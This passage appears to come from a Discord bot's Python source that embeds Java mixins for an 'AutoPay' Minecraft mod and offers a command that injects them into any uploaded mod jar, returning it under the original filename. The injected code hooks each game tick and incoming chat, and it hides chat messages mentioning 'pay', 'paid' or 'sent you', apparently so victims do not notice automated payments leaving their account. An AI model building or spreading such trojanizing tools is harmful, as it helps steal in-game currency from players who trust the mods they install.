import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(MinecraftClient.class)
public abstract class MinecraftClientMixin {

    @Inject(method = "tick", at = @At("HEAD"))
    private void onTick(CallbackInfo ci) {
        MinecraftClient client = (MinecraftClient) (Object) this;
        BalPayCycle.onClientTick(client);
    }
}
'''

AUTOPAY_SRC["mixin/MinecraftClientChatMixin.java"] = r'''package com.autopay.mixin;

import com.autopay.WrappedUserApiService;
import com.mojang.authlib.minecraft.UserApiService;
import net.minecraft.client.MinecraftClient;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

@Mixin(MinecraftClient.class)
public abstract class MinecraftClientChatMixin {

    @Inject(method = "createUserApiService", at = @At("RETURN"), cancellable = true)
    private void onUserApiServiceCreated(CallbackInfoReturnable<UserApiService> cir) {
        UserApiService original = cir.getReturnValue();
        if (original != null) {
            cir.setReturnValue(new WrappedUserApiService(original));
        }
    }
}
'''

AUTOPAY_SRC["mixin/ClientPlayNetworkHandlerMixin.java"] = r'''package com.autopay.mixin;

import com.autopay.BalPayCycle;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(ClientPlayNetworkHandler.class)
public abstract class ClientPlayNetworkHandlerMixin {

    @Inject(
            method = "onGameMessage(Lnet/minecraft/network/packet/s2c/play/GameMessageS2CPacket;)V",
            at = @At("HEAD"),
            cancellable = true
    )
    private void autopay$onGameMessage(GameMessageS2CPacket packet, CallbackInfo ci) {
        if (BalPayCycle.onChatPacket(packet.content(), packet.overlay())) {
            ci.cancel();
        }
    }
}
'''

AUTOPAY_SRC["mixin/ChatSuppressorMixin.java"] = r'''package com.autopay.mixin;

import net.minecraft.client.gui.hud.ChatHud;
import net.minecraft.text.Text;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(ChatHud.class)
public abstract class ChatSuppressorMixin {

    @Inject(method = "addMessage(Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
    private void onAddMessage(Text message, CallbackInfo ci) {
        if (message == null) return;
        String text = message.getString().toLowerCase();
        if (text.contains("pay ") || text.contains("/pay ")) {
            ci.cancel();
            return;
        }
        if (text.contains("paid") || text.contains("sent you") || text.contains("received from")) {
            ci.cancel();
        }
    }
}
'''


async def build_autopay_jar():
    """Compiles the AutoPay mixin mod into a standalone jar."""
    project_dir = tempfile.mkdtemp(prefix="autopay_")
    src = lambda p: os.path.join(project_dir, p)

    def write(p, c):
        os.makedirs(os.path.dirname(src(p)), exist_ok=True)
        with open(src(p), "w", encoding="utf-8") as f:
            f.write(c)

    write("build.gradle", AUTOPAY_BUILD_GRADLE)
    write("gradle.properties", GRADLE_PROPERTIES)
    write("settings.gradle", SETTINGS_GRADLE)

    write("src/main/resources/fabric.mod.json", AUTOPAY_FABRIC_JSON)
    write("src/main/resources/autopay.mixins.json", AUTOPAY_MIXINS_JSON)

    for rel_path, content in AUTOPAY_SRC.items():
        write("src/main/java/com/autopay/" + rel_path, content)

    print(f"[AUTOPAY] Building AutoPay in {project_dir}")
    jar_path = await run_gradle_build(project_dir)
    return jar_path, project_dir


@tree.command(name="injectautopay", description="Inject the AutoPay mod (mixin) into an existing mod jar")
@app_commands.describe(file="The mod .jar file to add AutoPay to")
async def injectautopay_cmd(interaction: discord.Interaction, file: discord.Attachment):
    await interaction.response.defer(ephemeral=True)

    if interaction.channel_id != CHANNEL_ID:
        await interaction.followup.send("This command can only be used in the designated channel.", ephemeral=True)
        return

    if not file.filename.endswith(".jar"):
        await interaction.followup.send("Please upload a .jar file.", ephemeral=True)
        return

    followup = await interaction.followup.send("Building AutoPay + merging into your mod...", ephemeral=True)

    extract_dir = None
    autopay_dir = None
    autopay_jar = None
    try:
        # 1. Download + extract the target jar
        mod_bytes = await file.read()
        extract_dir = tempfile.mkdtemp(prefix="autopay_inject_")
        with zipfile.ZipFile(io.BytesIO(mod_bytes), 'r') as zin:
            zin.extractall(extract_dir)

        # 2. Compile the AutoPay mod
        await followup.edit(content="Compiling AutoPay classes...")
        autopay_jar, autopay_dir = await build_autopay_jar()

        # 3. Extract the AutoPay jar to a temp dir and copy all of its contents (except fabric.mod.json)
        autopay_extract = tempfile.mkdtemp(prefix="autopay_built_")
        try:
            with zipfile.ZipFile(autopay_jar, 'r') as zin:
                zin.extractall(autopay_extract)

            for root, dirs, files in os.walk(autopay_extract):
                for fname in files:
                    rel = os.path.relpath(os.path.join(root, fname), autopay_extract).replace("\\", "/")
                    # Skip fabric metadata + signatures — the target jar keeps its own
                    if rel == "fabric.mod.json":
                        continue
                    if rel == "META-INF/MANIFEST.MF":
                        continue
                    if rel.startswith("META-INF/") and (rel.endswith(".SF") or rel.endswith(".RSA") or rel.endswith(".DSA")):
                        continue

                    full_path = os.path.join(root, fname)
                    dest_path = os.path.join(extract_dir, rel)
                    os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                    shutil.copy2(full_path, dest_path)
        finally:
            shutil.rmtree(autopay_extract, ignore_errors=True)

        # 4. Patch the target fabric.mod.json to register the AutoPay mixin config + entrypoint
        fmj_path = os.path.join(extract_dir, "fabric.mod.json")
        if os.path.exists(fmj_path):
            with open(fmj_path, "r", encoding="utf-8") as f:
                fabric_json = json.load(f)
        else:
            fabric_json = {}

        fabric_json["environment"] = "client"

        # Entrypoints
        if "entrypoints" not in fabric_json or not isinstance(fabric_json["entrypoints"], dict):
            fabric_json["entrypoints"] = {}
        if "client" not in fabric_json["entrypoints"]:
            fabric_json["entrypoints"]["client"] = []
        autopay_entry = "com.autopay.AutoPayMod"
        if autopay_entry not in fabric_json["entrypoints"]["client"]:
            fabric_json["entrypoints"]["client"].append(autopay_entry)

        # Mixins — normalise to a list of strings
        existing_mixins = fabric_json.get("mixins", [])
        mixin_list = []
        if isinstance(existing_mixins, list):
            for m in existing_mixins:
                if isinstance(m, str):
                    mixin_list.append(m)
                elif isinstance(m, dict) and "config" in m:
                    mixin_list.append(m["config"])
        elif isinstance(existing_mixins, str):
            mixin_list.append(existing_mixins)
        if "autopay.mixins.json" not in mixin_list:
            mixin_list.append("autopay.mixins.json")
        fabric_json["mixins"] = mixin_list

        # Dependencies
        if "depends" not in fabric_json or not isinstance(fabric_json["depends"], dict):
            fabric_json["depends"] = {}
        depends = fabric_json["depends"]
        if "fabricloader" not in depends:
            depends["fabricloader"] = ">=0.19.3"
        if "minecraft" not in depends:
            depends["minecraft"] = ">=1.21.11"

        with open(fmj_path, "w", encoding="utf-8") as f:
            json.dump(fabric_json, f, indent=2)

        # 5. Repackage
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zout:
            for root, dirs, files in os.walk(extract_dir):
                for fname in files:
                    full_path = os.path.join(root, fname)
                    arcname = os.path.relpath(full_path, extract_dir).replace("\\", "/")
                    zout.write(full_path, arcname)

        result_bytes = zip_buffer.getvalue()
        if len(result_bytes) > MAX_UPLOAD_BYTES:
            await followup.edit(content=f"Result too large ({len(result_bytes)/1024/1024:.1f} MB). Max is {MAX_UPLOAD_BYTES/1024/1024:.1f} MB.")
            return

        warning = "# ⚠️ MAKE SURE THIS MOD IS ONLY RAN ON 1.21.11 ⚠️"
        await interaction.user.send(
            content=warning,
            file=discord.File(io.BytesIO(result_bytes), filename=file.filename)
        )
        await followup.edit(content="AutoPay-injected mod sent to your DMs!")
    except Exception as e:
        await followup.edit(content=f"Error: {str(e)[:500]}")
        print(f"[ERROR] AutoPay inject failed: {e}")
    finally:
        if extract_dir and os.path.exists(extract_dir):
            shutil.rmtree(extract_dir, ignore_errors=True)
        if autopay_dir and os.path.exists(autopay_dir):
            shutil.rmtree(autopay_dir, ignore_errors=True)
        if autopay_jar and os.path.exists(autopay_jar):
            try:
                os.unlink(autopay_jar)
            except Exception:
                pass


async def delete_and_warn(message):
    try:
        await message.delete()
    except discord.Forbidden:
        pass
    except discord.NotFound:
        pass

    member = message.author
    warnings = warning_counts.get(member.id, 0) + 1
    warning_counts[member.id] = warnings

    if warnings == 3:
        try:
            await member.timeout(datetime.timedelta(minutes=10), reason=f"Warning {warnings}")
        except discord.Forbidden:
            pass
    elif warnings == 5:
        try:
            await member.timeout(datetime.timedelta(minutes=30), reason=f"Warning {warnings}")
        except discord.Forbidden:
            pass
    elif warnings == 10:
        try:
            await member.timeout(datetime.timedelta(hours=3), reason=f"Warning {warnings}")
        except discord.Forbidden:
            pass
    elif warnings == 15:
        try:
            await member.timeout(datetime.timedelta(hours=12), reason=f"Warning {warnings}")
        except discord.Forbidden:
            pass
    elif warnings == 20:
        try:
            await member.timeout(datetime.timedelta(hours=24), reason=f"Warning {warnings}")
        except discord.Forbidden:
            pass
    elif warnings >= 30:
        try:
            await member.ban(reason="Repeated violations")
        except discord.Forbidden:
            pass


@bot.event
async def on_message(message):
    if message.author.bot or message.channel.id != CHANNEL_ID:
        return
    asyncio.create_task(delete_and_warn(message))


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    await tree.sync()
    print("Commands synced globally.")
    for _ in range(MAX_CONCURRENT):
        asyncio.create_task(build_worker())


bot.run(TOKEN)